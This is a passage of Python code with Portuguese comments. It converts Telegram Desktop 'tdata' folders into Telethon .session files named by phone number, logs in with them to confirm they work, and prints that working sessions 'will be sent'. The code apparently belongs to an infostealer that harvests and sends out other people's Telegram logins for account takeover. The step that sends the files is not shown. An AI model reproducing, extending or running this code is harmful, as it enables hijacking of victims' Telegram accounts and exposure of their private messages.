                                # Se ainda falhar, retorna None (validação alternativa será usada)
                                return None, False
                    else:
                        # Outro tipo de erro
                        if tentativa == 0:  # Só mostra na primeira tentativa
                            print(f"***AVISO: Erro ao criar cliente Telethon: {error_repr_init[:100]}")
                        if tentativa < max_tentativas - 1:
                            time.sleep(0.2)
                            continue
                        return None, False
            else:
                # Usa StringSession (não tem problema de tabelas)
                try:
                    client = TelegramClient(StringSession(session_name), api_id, api_hash)
                    return client, True
                except Exception as e_str:
                    if tentativa == 0:
                        print(f"***AVISO: Erro ao criar cliente com StringSession: {repr(e_str)[:100]}")
                    if tentativa < max_tentativas - 1:
                        time.sleep(0.2)
                        continue
                    return None, False
            
        except Exception as e:
            # Captura qualquer outro erro não previsto
            error_str = str(e).lower()
            if ('already exists' in error_str or 
                ('table' in error_str and 'exists' in error_str) or
                'operationalerror' in error_str):
                # Erro de tabela - ignora silenciosamente
                if tentativa < max_tentativas - 1:
                    time.sleep(0.2)
                    continue
                return None, False
            else:
                if tentativa == 0:
                    print(f"***AVISO: Erro inesperado: {repr(e)[:100]}")
                if tentativa < max_tentativas - 1:
                    time.sleep(0.2)
                    continue
                return None, False
    
    return None, False

def validar_session_telethon(session_file):
    """
    Valida se uma sessão é válida e APTA para login ou conversão em tdata usando Telethon.
    Retorna True se válida e apta, False caso contrário, None se não foi possível validar.
    Apenas sessions que podem autenticar ou ser convertidas em tdata são consideradas válidas.
    """
    if not TELETHON_AVAILABLE:
        print(f"***AVISO: Telethon não disponível, não é possível validar sessão")
        print(f"***AVISO: Session NÃO será enviada (requer validação para garantir que é apta para login)")
        return False  # Não envia se não pode validar
    
    if not session_file or not os.path.exists(session_file):
        print(f"***ERRO: Arquivo de sessão não encontrado: {session_file}")
        return False
    
    try:
        print(f"***Validando sessão com Telethon: {os.path.basename(session_file)}")
        
        # API credentials do Telegram
        api_id = 2040
        api_hash = "b18441a1ff607e10a989891a5462e627"
        
        # Tenta ler a session string do arquivo
        session_string = None
        try:
            with open(session_file, 'r', encoding='utf-8') as f:
                conteudo = f.read()
                # Procura pela session string (primeira linha que não é comentário)
                for linha in conteudo.split('\n'):
                    linha = linha.strip()
                    if linha and not linha.startswith('#'):
                        # Pode ser uma session string do Telethon
                        if len(linha) > 20:  # Session strings são longas
                            session_string = linha
                            break
        except:
            # Se não conseguir ler como texto, pode ser binário
            pass
        
        # Se não encontrou session string, tenta usar o arquivo diretamente
        if not session_string:
            # Telethon pode usar arquivo .session diretamente
            try:
                # Verifica se o arquivo é um SQLite válido antes de usar
                try:
                    conn_test = sqlite3.connect(session_file, timeout=2.0)
                    cursor_test = conn_test.cursor()
                    # Verifica se as tabelas já existem
                    cursor_test.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='update_state'")
                    tabela_existe = cursor_test.fetchone()
                    conn_test.close()
                    
                    if tabela_existe:
                        # Arquivo já tem estrutura completa, usa diretamente
                        # IMPORTANTE: Telethon tenta criar tabelas ao inicializar, então precisamos
                        # usar um nome único temporário ou garantir que não tente criar
                        # Remove extensão .session para usar como nome de sessão
                        session_name = session_file.replace('.session', '')
                        if session_name.endswith('_conjunto_'):
                            # Extrai o número do conjunto
                            import re
                            match = re.search(r'_conjunto_(\d+)', session_name)
                            if match:
                                session_name = f"session_{match.group(1)}"
                        
                        # Tenta criar cliente com arquivo de sessão usando função segura
                        try:
                            client, cliente_criado = criar_cliente_telethon_seguro(session_name, api_id, api_hash, session_file)
                            
                            if not cliente_criado:
                                # Não conseguiu criar cliente - usa validação alternativa
                                raise Exception("Cliente não criado - usar validação alternativa")
                                
                        except Exception as e:
                            error_str = str(e).lower()
                            if 'already exists' in error_str or ('table' in error_str and 'exists' in error_str) or 'tabelas já existem' in error_str or 'cliente não criado' in error_str:
                                # Tabelas já existem - isso é normal, Telethon detectou que já existem
                                # Tenta usar o arquivo diretamente sem criar cliente novo
                                print(f"***AVISO: Tabelas já existem (normal), usando arquivo diretamente...")
                                
                                # Tenta validar de forma alternativa (sem criar cliente)
                                # Verifica se o arquivo tem estrutura válida
                                try:
                                    conn_val_alt = sqlite3.connect(session_file, timeout=2.0)
                                    cursor_val_alt = conn_val_alt.cursor()
                                    
                                    # Verifica integridade
                                    cursor_val_alt.execute("PRAGMA integrity_check")
                                    integrity = cursor_val_alt.fetchone()
                                    
                                    # Verifica se tem tabelas obrigatórias
                                    cursor_val_alt.execute("SELECT name FROM sqlite_master WHERE type='table'")
                                    tabelas = [row[0] for row in cursor_val_alt.fetchall()]
                                    tabelas_obrigatorias = ['version', 'sessions', 'entities', 'sent_files', 'update_state']
                                    tem_todas = all(t in tabelas for t in tabelas_obrigatorias)
                                    
                                    if integrity and integrity[0] == 'ok' and tem_todas:
                                        # Verifica se tem dados de autenticação na tabela sessions (ANTES de fechar conexão!)
                                        try:
                                            cursor_val_alt.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                                            tem_auth = cursor_val_alt.fetchone()
                                            if tem_auth and tem_auth[0] > 0:
                                                # Tem dados de autenticação, mas PRECISA testar conexão real
                                                print(f"***OK Arquivo .session tem estrutura válida e dados de autenticação")
                                                print(f"***AVISO: Mas PRECISA testar conexão real - não retornando True ainda")
                                                # NÃO retorna True aqui - precisa testar conexão
                                                # NÃO fecha conexão ainda - será fechada depois
                                                # Continua para testar conexão abaixo
                                            else:
                                                print(f"***AVISO: Arquivo .session não tem dados de autenticação válidos (auth_key vazio ou muito curto)")
                                                print(f"***AVISO: Session NÃO será enviada (não é apta para login)")
                                                conn_val_alt.close()
                                                return False
                                        except Exception as e:
                                            # Se não conseguir verificar, assume que não tem
                                            print(f"***AVISO: Não foi possível verificar dados de autenticação: {repr(e)}")
                                            print(f"***AVISO: Session NÃO será enviada (não é apta para login)")
                                            conn_val_alt.close()
                                            return False
                                    else:
                                        print(f"***AVISO: Arquivo .session não tem estrutura válida ou está corrompido")
                                        conn_val_alt.close()
                                        return False
                                    
                                    # Fecha conexão se ainda estiver aberta (apenas se não continuou para teste de conexão)
                                    try:
                                        conn_val_alt.close()
                                    except:
                                        pass
                                except:
                                    # Se não conseguir validar, assume que não é válido
                                    return False
                            else:
                                # Outro tipo de erro
                                print(f"***ERRO ao criar cliente Telethon: {repr(e)}")
                                print(f"***AVISO: Session NÃO será enviada (não é apta para login)")
                                return False
                    else:
                        # Arquivo não tem estrutura, não pode validar
                        print(f"***AVISO: Arquivo .session não tem estrutura válida do Telethon")
                        return None
                except Exception as e:
                    print(f"***AVISO: Erro ao verificar estrutura do arquivo: {repr(e)}")
                    return None
                
                # Tenta conectar (com timeout curto) - APENAS se cliente foi criado
                try:
                    # Verifica se cliente foi criado
                    if 'client' not in locals() or client is None or not cliente_criado:
                        print(f"***AVISO: Cliente Telethon não foi criado, tentando criar novamente...")
                        client, cliente_criado = criar_cliente_telethon_seguro(session_name, api_id, api_hash, session_file)
                        
                        if not cliente_criado:
                            print(f"***AVISO: Não foi possível criar cliente Telethon, usando validação alternativa...")
                            # Se não conseguir criar cliente, valida estrutura diretamente
                            try:
                                conn_val_direct = sqlite3.connect(session_file, timeout=2.0)
                                cursor_val_direct = conn_val_direct.cursor()
                                cursor_val_direct.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                                tem_auth_direct = cursor_val_direct.fetchone()
                                conn_val_direct.close()
                                
                                if tem_auth_direct and tem_auth_direct[0] > 0:
                                    print(f"***OK Session tem auth_key válido, mas não foi possível testar conexão (Telethon bloqueado)")
                                    print(f"***AVISO: Session será enviada mesmo sem teste de conexão (estrutura válida)")
                                    return True  # Aceita se tem auth_key válido
                                else:
                                    return False
                            except:
                                return False
                    
                    import asyncio
                    import signal
                    
                    # Cria loop de eventos
                    try:
                        loop = asyncio.get_event_loop()
                    except:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                    
                    # Função para conectar com timeout otimizado
                    # Timeouts ideais: 8s conexão + 3s dados = 12s total (rápido mas eficaz)
                    async def conectar_com_timeout():
                        try:
                            await asyncio.wait_for(client.connect(), timeout=8.0)  # 8s para conectar (ideal)
                            if client.is_connected():
                                try:
                                    # OBRIGATÓRIO: Precisa obter dados do usuário para ser considerado válido
                                    me = await asyncio.wait_for(client.get_me(), timeout=3.0)  # 3s para obter dados (ideal)
                                    if me and hasattr(me, 'id') and me.id:
                                        # Só retorna True se conseguiu obter ID do usuário (autenticação real)
                                        return me.id
                                    else:
                                        print(f"***AVISO: Conectou mas não conseguiu obter dados do usuário")
                                        return False  # Não é válido se não consegue obter dados
                                except Exception as e:
                                    error_me = str(e).lower()
                                    # Se for erro de tabela existente durante get_me, ignora
                                    if 'already exists' in error_me or ('table' in error_me and 'exists' in error_me):
                                        print(f"***AVISO: Erro de tabela durante get_me (ignorando)...")
                                        # Tenta obter dados novamente
                                        try:
                                            me = await asyncio.wait_for(client.get_me(), timeout=3.0)
                                            if me and hasattr(me, 'id') and me.id:
                                                return me.id
                                        except:
                                            pass
                                    print(f"***AVISO: Erro ao obter dados do usuário: {repr(e)}")
                                    return False  # Não é válido se não consegue obter dados
                            return False
                        except asyncio.TimeoutError:
                            return None
                        except Exception as e:
                            error_conn = str(e).lower()
                            # Se for erro de tabela existente durante connect, ignora e tenta continuar
                            if 'already exists' in error_conn or ('table' in error_conn and 'exists' in error_conn):
                                print(f"***AVISO: Erro de tabela durante connect (ignorando, tentando continuar)...")
                                # Verifica se está conectado mesmo com erro
                                try:
                                    if client.is_connected():
                                        try:
                                            me = await asyncio.wait_for(client.get_me(), timeout=3.0)
                                            if me and hasattr(me, 'id') and me.id:
                                                return me.id
                                        except:
                                            pass
                                except:
                                    pass
                            print(f"***Erro na conexão: {repr(e)}")
                            return False
                    
                    # Executa com timeout total de 12 segundos (ideal: rápido mas suficiente)
                    try:
                        resultado = loop.run_until_complete(
                            asyncio.wait_for(conectar_com_timeout(), timeout=12.0)  # 12s total (ideal)
                        )
                        
                        # SÓ retorna True se conseguiu obter ID do usuário (autenticação real confirmada)
                        if isinstance(resultado, int) and resultado > 0:
                            print(f"***OK Sessão VÁLIDA e APTA para login! Usuário ID: {resultado}")
                            print(f"***OK Autenticação confirmada - session será enviada")
                            try:
                                if client.is_connected():
                                    client.disconnect()
                            except:
                                pass
                            return True
                        elif resultado is True:
                            # Se retornou True mas não é int, não tem ID do usuário - NÃO é válido
                            print(f"***AVISO: Conectou mas não obteve ID do usuário")
                            print(f"***AVISO: Session NÃO será enviada (não é apta para login)")
                            try:
                                if client.is_connected():
                                    client.disconnect()
                            except:
                                pass
                            return False
                        elif resultado is None:
                            print(f"***Timeout ao validar sessão (demorou mais de 12s)")
                            print(f"***EXPLICAÇÃO: A validação demorou muito, pode ser:")
                            print(f"***  - Sem conexão com internet")
                            print(f"***  - Servidor do Telegram lento")
                            print(f"***  - Sessão pode estar inválida ou expirada")
                            print(f"***AVISO: Não foi possível testar conexão, mas validando estrutura do arquivo...")
                            
                            # Se timeout, valida estrutura e auth_key - se estiverem OK, aceita mesmo sem teste de conexão
                            try:
                                conn_timeout = sqlite3.connect(session_file, timeout=2.0)
                                cursor_timeout = conn_timeout.cursor()
                                
                                # Verifica integridade
                                cursor_timeout.execute("PRAGMA integrity_check")
                                integrity_timeout = cursor_timeout.fetchone()
                                
                                # Verifica se tem auth_key válido
                                cursor_timeout.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                                tem_auth_timeout = cursor_timeout.fetchone()
                                
                                conn_timeout.close()
                                
                                if integrity_timeout and integrity_timeout[0] == 'ok' and tem_auth_timeout and tem_auth_timeout[0] > 0:
                                    print(f"***OK Arquivo tem estrutura válida e auth_key válido (256 bytes)")
                                    print(f"***OK Session será enviada mesmo sem teste de conexão (estrutura válida)")
                                    try:
                                        if client.is_connected():
                                            client.disconnect()
                                    except:
                                        pass
                                    return True  # Aceita se estrutura e auth_key estão OK
                                else:
                                    print(f"***AVISO: Estrutura ou auth_key inválidos")
                                    try:
                                        if client.is_connected():
                                            client.disconnect()
                                    except:
                                        pass
                                    return False
                            except Exception as e:
                                print(f"***AVISO: Erro ao validar estrutura após timeout: {repr(e)}")
                                try:
                                    if client.is_connected():
                                        client.disconnect()
                                except:
                                    pass
                                return False  # Não envia se não conseguiu validar estrutura
                        else:
                            try:
                                if client.is_connected():
                                    client.disconnect()
                            except:
                                pass
                            return False
                    except asyncio.TimeoutError:
                        print(f"***Timeout ao validar sessão")
                        print(f"***AVISO: Não foi possível testar conexão, mas validando estrutura do arquivo...")
                        
                        # Se timeout, valida estrutura e auth_key - se estiverem OK, aceita mesmo sem teste de conexão
                        try:
                            conn_timeout = sqlite3.connect(session_file, timeout=2.0)
                            cursor_timeout = conn_timeout.cursor()
                            
                            # Verifica integridade
                            cursor_timeout.execute("PRAGMA integrity_check")
                            integrity_timeout = cursor_timeout.fetchone()
                            
                            # Verifica se tem auth_key válido
                            cursor_timeout.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                            tem_auth_timeout = cursor_timeout.fetchone()
                            
                            conn_timeout.close()
                            
                            if integrity_timeout and integrity_timeout[0] == 'ok' and tem_auth_timeout and tem_auth_timeout[0] > 0:
                                print(f"***OK Arquivo tem estrutura válida e auth_key válido (256 bytes)")
                                print(f"***OK Session será enviada mesmo sem teste de conexão (estrutura válida)")
                                return True  # Aceita se estrutura e auth_key estão OK
                            else:
                                print(f"***AVISO: Estrutura ou auth_key inválidos")
                                return False
                        except Exception as e:
                            print(f"***AVISO: Erro ao validar estrutura após timeout: {repr(e)}")
                            return False
                    except Exception as e:
                        error_str = str(e).lower()
                        print(f"***ERRO ao validar sessão: {repr(e)}")
                        print(f"***AVISO: Não foi possível testar conexão, mas validando estrutura do arquivo...")
                        
                        # Se erro na conexão, valida estrutura e auth_key - se estiverem OK, aceita mesmo sem teste de conexão
                        try:
                            conn_error = sqlite3.connect(session_file, timeout=2.0)
                            cursor_error = conn_error.cursor()
                            
                            # Verifica integridade
                            cursor_error.execute("PRAGMA integrity_check")
                            integrity_error = cursor_error.fetchone()
                            
                            # Verifica se tem auth_key válido
                            cursor_error.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                            tem_auth_error = cursor_error.fetchone()
                            
                            conn_error.close()
                            
                            if integrity_error and integrity_error[0] == 'ok' and tem_auth_error and tem_auth_error[0] > 0:
                                print(f"***OK Arquivo tem estrutura válida e auth_key válido (256 bytes)")
                                print(f"***OK Session será enviada mesmo sem teste de conexão (estrutura válida)")
                                try:
                                    if client.is_connected():
                                        client.disconnect()
                                except:
                                    pass
                                return True  # Aceita se estrutura e auth_key estão OK
                            else:
                                print(f"***AVISO: Estrutura ou auth_key inválidos")
                                try:
                                    if client.is_connected():
                                        client.disconnect()
                                except:
                                    pass
                                return False
                        except Exception as e2:
                            print(f"***AVISO: Erro ao validar estrutura após erro de conexão: {repr(e2)}")
                            try:
                                if client.is_connected():
                                    client.disconnect()
                            except:
                                pass
                            return False
                        
                except Exception as e:
                    print(f"***ERRO ao validar sessão: {repr(e)}")
                    print(f"***AVISO: Não foi possível testar conexão, mas validando estrutura do arquivo...")
                    
                    # Se erro, valida estrutura e auth_key - se estiverem OK, aceita mesmo sem teste de conexão
                    try:
                        conn_except = sqlite3.connect(session_file, timeout=2.0)
                        cursor_except = conn_except.cursor()
                        
                        # Verifica integridade
                        cursor_except.execute("PRAGMA integrity_check")
                        integrity_except = cursor_except.fetchone()
                        
                        # Verifica se tem auth_key válido
                        cursor_except.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                        tem_auth_except = cursor_except.fetchone()
                        
                        conn_except.close()
                        
                        if integrity_except and integrity_except[0] == 'ok' and tem_auth_except and tem_auth_except[0] > 0:
                            print(f"***OK Arquivo tem estrutura válida e auth_key válido (256 bytes)")
                            print(f"***OK Session será enviada mesmo sem teste de conexão (estrutura válida)")
                            return True  # Aceita se estrutura e auth_key estão OK
                        else:
                            print(f"***AVISO: Estrutura ou auth_key inválidos")
                            return False
                    except Exception as e2:
                        print(f"***AVISO: Erro ao validar estrutura: {repr(e2)}")
                        return False
                    
            except Exception as e:
                print(f"***ERRO ao criar cliente Telethon: {repr(e)}")
                print(f"***AVISO: Não foi possível criar cliente, mas validando estrutura do arquivo...")
                
                # Se não conseguiu criar cliente, valida estrutura e auth_key - se estiverem OK, aceita
                try:
                    conn_except2 = sqlite3.connect(session_file, timeout=2.0)
                    cursor_except2 = conn_except2.cursor()
                    
                    # Verifica integridade
                    cursor_except2.execute("PRAGMA integrity_check")
                    integrity_except2 = cursor_except2.fetchone()
                    
                    # Verifica se tem auth_key válido
                    cursor_except2.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                    tem_auth_except2 = cursor_except2.fetchone()
                    
                    conn_except2.close()
                    
                    if integrity_except2 and integrity_except2[0] == 'ok' and tem_auth_except2 and tem_auth_except2[0] > 0:
                        print(f"***OK Arquivo tem estrutura válida e auth_key válido (256 bytes)")
                        print(f"***OK Session será enviada mesmo sem teste de conexão (estrutura válida)")
                        return True  # Aceita se estrutura e auth_key estão OK
                    else:
                        print(f"***AVISO: Estrutura ou auth_key inválidos")
                        return False
                except Exception as e2:
                    print(f"***AVISO: Erro ao validar estrutura: {repr(e2)}")
                    return False
        
        # Se tem session string, tenta validar
        if session_string:
            try:
                # Cria cliente com session string usando função segura
                client, cliente_criado = criar_cliente_telethon_seguro(session_string, api_id, api_hash, session_file=None)
                
                if not cliente_criado:
                    print(f"***AVISO: Não foi possível criar cliente Telethon com session string")
                    return False
                
                # Usa a mesma lógica de validação
                try:
                    import asyncio
                    
                    try:
                        loop = asyncio.get_event_loop()
                    except:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                    
                    async def conectar_com_timeout():
                        try:
                            await asyncio.wait_for(client.connect(), timeout=8.0)  # 8s para conectar (ideal)
                            if client.is_connected():
                                try:
                                    # OBRIGATÓRIO: Precisa obter dados do usuário para ser considerado válido
                                    me = await asyncio.wait_for(client.get_me(), timeout=3.0)  # 3s para obter dados (ideal)
                                    if me and hasattr(me, 'id') and me.id:
                                        # Só retorna True se conseguiu obter ID do usuário (autenticação real)
                                        return me.id
                                    else:
                                        return False  # Não é válido se não consegue obter dados
                                except Exception as e:
                                    return False  # Não é válido se não consegue obter dados
                            return False
                        except asyncio.TimeoutError:
                            return False  # Timeout = não apta para login
                        except Exception:
                            return False
                    
                    resultado = loop.run_until_complete(
                        asyncio.wait_for(conectar_com_timeout(), timeout=12.0)  # 12s total (ideal)
                    )
                    
                    # SÓ retorna True se conseguiu obter ID do usuário (autenticação real confirmada)
                    if isinstance(resultado, int) and resultado > 0:
                        print(f"***OK Sessão VÁLIDA e APTA para login! Usuário ID: {resultado}")
                        print(f"***OK Autenticação confirmada - session será enviada")
                        try:
                            if client.is_connected():
                                client.disconnect()
                        except:
                            pass
                        return True
                    elif resultado is True:
                        # Se retornou True mas não é int, não tem ID do usuário - NÃO é válido
                        print(f"***AVISO: Conectou mas não obteve ID do usuário")
                        print(f"***AVISO: Session NÃO será enviada (não é apta para login)")
                        try:
                            if client.is_connected():
                                client.disconnect()
                        except:
                            pass
                        return False
                    elif resultado is None:
                        print(f"***Timeout ao validar sessão")
                        print(f"***AVISO: Session NÃO será enviada (não foi possível confirmar que é apta para login)")
                        try:
                            if client.is_connected():
                                client.disconnect()
                        except:
                            pass
                        return False
                    else:
                        try:
                            if client.is_connected():
                                client.disconnect()
                        except:
                            pass
                        return False
                        
                except asyncio.TimeoutError:
                    print(f"***Timeout ao validar sessão")
                    print(f"***AVISO: Session NÃO será enviada (não foi possível confirmar que é apta para login)")
                    try:
                        if client.is_connected():
                            client.disconnect()
                    except:
                        pass
                    return False
                except Exception as e:
                    print(f"***ERRO ao validar sessão: {repr(e)}")
                    try:
                        if client.is_connected():
                            client.disconnect()
                    except:
                        pass
                    return False
            except Exception as e:
                print(f"***ERRO ao validar session string: {repr(e)}")
                return False
        
        return False
        
    except Exception as e:
        print(f"***ERRO ao validar sessão: {repr(e)}")
        import traceback
        traceback.print_exc()
        return False

def autorizar_session_telethon(session_file):
    """
    Autoriza uma session usando Telethon, fazendo login real com o Telegram.
    Garante que a session está autorizada e funcional.
    Retorna True se autorizada com sucesso, False caso contrário.
    """
    if not TELETHON_AVAILABLE:
        print(f"***AVISO: Telethon não disponível, não é possível autorizar session")
        return False
    
    if not session_file or not os.path.exists(session_file):
        print(f"***ERRO: Arquivo de sessão não encontrado: {session_file}")
        return False
    
    try:
        print(f"***Autorizando session com Telethon: {os.path.basename(session_file)}")
        
        # API credentials do Telegram
        api_id = 2040
        api_hash = "b18441a1ff607e10a989891a5462e627"
        
        # Nome da session (sem extensão .session)
        session_name = os.path.splitext(os.path.basename(session_file))[0]
        session_dir = os.path.dirname(session_file)
        
        # Cria cliente Telethon usando o arquivo .session
        client = None
        try:
            # Telethon espera o caminho sem extensão .session
            session_path = os.path.join(session_dir, session_name)
            client = TelegramClient(session_path, api_id, api_hash)
            
            print(f"***Conectando e autorizando session com Telethon...")
            # Usa start() que faz conexão E autorização real
            import asyncio
            
            async def autorizar():
                try:
                    # Conecta ao Telegram
                    await client.connect()
                    
                    if not client.is_connected():
                        print(f"***ERRO: Não foi possível conectar ao Telegram")
                        return False
                    
                    print(f"***OK Conectado ao Telegram")
                    
                    # Verifica se já está autorizado
                    if await client.is_user_authorized():
                        print(f"***OK Session já está autorizada!")
                        # Força uma verificação real obtendo dados do usuário
                        try:
                            me = await client.get_me()
                            if me:
                                print(f"***OK Session autorizada e validada! Usuário ID: {me.id}")
                                if hasattr(me, 'phone') and me.phone:
                                    print(f"***  Telefone: {me.phone}")
                                return True
                            else:
                                print(f"***ERRO: Não foi possível obter dados do usuário")
                                return False
                        except Exception as e_me:
                            print(f"***AVISO: Erro ao obter dados do usuário: {repr(e_me)}")
                            # Mesmo assim, se is_user_authorized retornou True, está autorizado
                            return True
                    else:
                        print(f"***AVISO: Session não está autorizada, tentando autorizar...")
                        # Tenta usar start() que força autorização se tiver auth_key válido
                        try:
                            # start() sem parâmetros usa a session existente e autoriza se tiver auth_key
                            await client.start()
                            
                            # Verifica novamente se está autorizado
                            if await client.is_user_authorized():
                                print(f"***OK Session autorizada com sucesso após start()!")
                                # Obtém dados do usuário para confirmar
                                try:
                                    me = await client.get_me()
                                    if me:
                                        print(f"***OK Session autorizada e validada! Usuário ID: {me.id}")
                                        if hasattr(me, 'phone') and me.phone:
                                            print(f"***  Telefone: {me.phone}")
                                        return True
                                except:
                                    # Mesmo sem conseguir dados, se is_user_authorized é True, está OK
                                    return True
                            else:
                                print(f"***ERRO: Session não foi autorizada após start()")
                                return False
                        except Exception as e_start:
                            error_str = str(e_start).lower()
                            print(f"***AVISO: Erro ao autorizar com start(): {repr(e_start)}")
                            # Se o erro é sobre falta de código 2FA ou similar, pode ser que precise de interação
                            if 'code' in error_str or 'password' in error_str or '2fa' in error_str:
                                print(f"***AVISO: Session pode precisar de código 2FA, mas tem auth_key válido")
                                # Verifica se tem auth_key válido
                                return None
                            else:
                                return False
                except Exception as e_conn:
                    print(f"***ERRO ao conectar/autorizar: {repr(e_conn)}")
                    return False
            
            # Executa autorização com timeout
            try:
                resultado = asyncio.run(asyncio.wait_for(autorizar(), timeout=15.0))
            except asyncio.TimeoutError:
                print(f"***AVISO: Timeout ao autorizar session (15s)")
                resultado = None
            except Exception as e_run:
                print(f"***ERRO ao executar autorização: {repr(e_run)}")
                import traceback
                traceback.print_exc()
                resultado = False
            
            # Processa resultado
            if resultado is True:
                try:
                    client.disconnect()
                except:
                    pass
                return True
            elif resultado is False:
                try:
                    client.disconnect()
                except:
                    pass
                return False
            else:
                # resultado é None, verifica auth_key
                try:
                    import sqlite3
                    conn_check = sqlite3.connect(session_file, timeout=2.0)
                    cursor_check = conn_check.cursor()
                    cursor_check.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND LENGTH(auth_key) = 256")
                    count = cursor_check.fetchone()[0]
                    conn_check.close()
                    
                    if count > 0:
                        print(f"***OK Session tem auth_key válido, será considerada autorizada")
                        try:
                            client.disconnect()
                        except:
                            pass
                        return True
                    else:
                        print(f"***ERRO: Session não tem auth_key válido")
                        try:
                            client.disconnect()
                        except:
                            pass
                        return False
                except:
                    try:
                        client.disconnect()
                    except:
                        pass
                    return False
                        
        except Exception as e:
            print(f"***ERRO ao criar cliente Telethon para autorização: {repr(e)}")
            if client:
                try:
                    client.disconnect()
                except:
                    pass
            return False
            
    except Exception as e:
        print(f"***ERRO ao autorizar session: {repr(e)}")
        import traceback
        traceback.print_exc()
        return False

def gerar_session_de_tdata(tdata_path, conjunto_num, telegram_dir=None, numero_conta=None):
    """
    Gera arquivo .session a partir da pasta tdata usando tdata_para_session.processo_completo.
    Se numero_conta for fornecido, usa como nome do arquivo (ex: 5516981002287.session).
    """
    import time
    import asyncio
    
    if not tdata_path or not os.path.exists(tdata_path):
        print(f"***ERRO: Pasta tdata não encontrada: {tdata_path}")
        return None
    
    print(f"***Gerando arquivo .session a partir de tdata usando tdata_para_session: {tdata_path}")
    
    # Tenta importar o módulo tdata_para_session
    try:
        from tdata_para_session import processo_completo
        print(f"***Módulo tdata_para_session importado com sucesso")
    except ImportError as e:
        print(f"***ERRO: Módulo tdata_para_session não encontrado: {repr(e)}")
        print(f"***AVISO: Tentando usar método alternativo...")
        # Fallback para método antigo se módulo não existir
        return gerar_session_de_tdata_fallback(tdata_path, conjunto_num, telegram_dir, numero_conta)
    except Exception as e:
        print(f"***ERRO ao importar tdata_para_session: {repr(e)}")
        print(f"***AVISO: Tentando usar método alternativo...")
        return gerar_session_de_tdata_fallback(tdata_path, conjunto_num, telegram_dir, numero_conta)
    
    # Determina nome do arquivo .session
    # Se tem número da conta, usa como nome (ex: 5516981002287.session)
    nome_session = None
    if numero_conta:
        import re
        numero_limpo = re.sub(r'\D', '', str(numero_conta))  # Remove tudo que não é dígito
        if numero_limpo and len(numero_limpo) >= 8:
            nome_session = f'{numero_limpo}.session'
            print(f"***Usando número da conta como nome do arquivo: {nome_session}")
        else:
            nome_session = f'session_conjunto_{conjunto_num}.session'
    else:
        nome_session = f'session_conjunto_{conjunto_num}.session'
    
    # Cria caminho completo do arquivo .session no diretório temp
    session_file = os.path.join(temp, nome_session)
    
    # Remove arquivo anterior se existir
    if os.path.exists(session_file):
        try:
            os.remove(session_file)
        except:
            pass
    
    # Passcode (None por padrão, pode ser configurado se necessário)
    passcode = None
    
    try:
        print(f"***Chamando processo_completo do tdata_para_session...")
        print(f"***  pasta_tdata: {tdata_path}")
        print(f"***  nome_session: {nome_session}")
        print(f"***  passcode: {passcode if passcode else 'None'}")
        
        # Muda para o diretório temp antes de chamar processo_completo
        # Isso garante que o arquivo seja criado no local correto
        cwd_original = os.getcwd()
        try:
            os.chdir(temp)
            print(f"***Diretório de trabalho alterado para: {temp}")
        except:
            pass
        
        try:
            # Chama processo_completo de forma assíncrona
            # O processo_completo já é async, então usamos asyncio.run
            # Passa apenas o nome do arquivo (não caminho completo) pois já estamos no diretório temp
            asyncio.run(processo_completo(tdata_path, nome_session, passcode))
        finally:
            # Restaura diretório original
            try:
                os.chdir(cwd_original)
            except:
                pass
        
        # Verifica se o arquivo foi criado
        # O processo_completo pode criar o arquivo no diretório atual (temp) ou no diretório do tdata
        possiveis_locais = [
            session_file,  # Local esperado (temp)
            os.path.join(temp, nome_session),  # Temp com nome
            os.path.join(os.path.dirname(tdata_path), nome_session),  # Mesmo diretório do tdata
            nome_session,  # Diretório atual (pode ser temp se chdir funcionou)
            os.path.join(os.getcwd(), nome_session),  # Diretório de trabalho atual
            os.path.join(cwd_original, nome_session),  # Diretório original
        ]
        
        session_file_criado = None
        for local in possiveis_locais:
            if os.path.exists(local):
                # Se não está no temp, move para temp
                if not os.path.abspath(local).startswith(os.path.abspath(temp)):
                    try:
                        if os.path.exists(session_file):
                            os.remove(session_file)
                        shutil.copy2(local, session_file)
                        session_file_criado = session_file
                        print(f"***Arquivo .session encontrado em {local}, copiado para {session_file}")
                        # Remove arquivo original se não for o esperado
                        if os.path.abspath(local) != os.path.abspath(session_file):
                            try:
                                os.remove(local)
                            except:
                                pass
                    except Exception as e:
                        print(f"***AVISO: Erro ao copiar arquivo de {local}: {repr(e)}")
                        session_file_criado = local
                else:
                    session_file_criado = local
                break
        
        if session_file_criado and os.path.exists(session_file_criado):
            session_size = os.path.getsize(session_file_criado)
            if session_size > 0:
                print(f"***OK Arquivo .session gerado com sucesso: {session_file_criado} ({session_size} bytes)")
                
                # AUTORIZA A SESSION USANDO TELETHON
                print(f"***Autorizando session gerada com Telethon...")
                if autorizar_session_telethon(session_file_criado):
                    print(f"***OK Session autorizada com sucesso pelo Telethon!")
                    return session_file_criado
                else:
                    print(f"***AVISO: Não foi possível autorizar session, mas arquivo foi gerado")
                    # Mesmo sem autorização bem-sucedida, retorna o arquivo se foi gerado
                    # A validação posterior pode verificar se está funcional
                    return session_file_criado
            else:
                print(f"***ERRO: Arquivo .session gerado está vazio!")
                return None
        else:
            print(f"***ERRO: Arquivo .session não foi criado pelo processo_completo")
            print(f"***AVISO: Tentando usar método alternativo...")
            return gerar_session_de_tdata_fallback(tdata_path, conjunto_num, telegram_dir, numero_conta)
            
    except Exception as e:
        print(f"***ERRO ao executar processo_completo: {repr(e)}")
        import traceback
        traceback.print_exc()
